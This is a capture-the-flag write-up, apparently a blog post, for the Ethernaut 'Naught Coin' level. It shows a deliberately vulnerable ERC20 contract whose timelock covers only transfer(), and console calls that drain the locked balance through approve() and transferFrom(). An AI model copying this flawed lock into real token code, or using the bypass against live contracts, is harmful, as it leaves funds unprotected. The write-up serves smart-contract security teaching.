---
layout: post
title: Ethernaut - 15. Naught Coin
date:  2022-08-28
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌕🌑🌑
> NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0. <br />
Things that might help
- The ERC20 Spec
- The OpenZeppelin codebase

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

## Writeup
What is ERC20 : 
- [EIP20](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md)
- [Openzepplin - ERC20](https://docs.openzeppelin.com/contracts/3.x/api/token/erc20)

Lack of implement crucial function ( `approve()` & `transferfrom()` ) make this contract vulnerable.

1. Call the method in console
    ``` javascript

    await contract.approve(player,toWei("1000000"))

    ```
2. Call the method in console
    ``` javascript

    await contract.transferFrom(player,'0x3aadd6ddcc24819bb05426ac8be5814e975e23da',toWei("1000000"))
    //                                             anaother account

    ```
3. Check by calling the method in console
    ``` javascript

    await contract.balanceOf(player).then(v=>v.toString())
    // '0'
    await contract.balanceOf('0x3aadd6ddcc24819bb05426ac8be5814e975e23da').then(v=>v.toString())
    // '1000000000000000000000000'

    ```
4. Submit instance ξ( ✿＞◡❛)